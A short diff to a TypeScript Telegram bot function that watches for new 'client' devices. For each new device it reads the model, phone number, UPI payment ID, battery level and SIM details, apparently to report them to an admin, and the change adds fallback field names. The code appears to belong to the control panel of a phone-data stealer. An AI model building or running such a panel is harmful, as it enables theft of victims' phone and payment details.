@@ -28,8 +28,8 @@ export function startDeviceWatcher(bot: Telegraf, adminId: number): void {
       for (const id of currentIds) {
         if (!knownDevices.has(id)) {
           const device = clients[id];
-          const model = device?.model || "Unknown Model";
-          const phone = device?.phone || "Unknown";
+          const model = device?.modelName || device?.model || "Unknown Model";
+          const phone = device?.mobNo || device?.phone || "Unknown";
           const upi = device?.upi || "N/A";
           const battery = device?.battery || "?%";
           const sim1 = device?.sim1 || "";
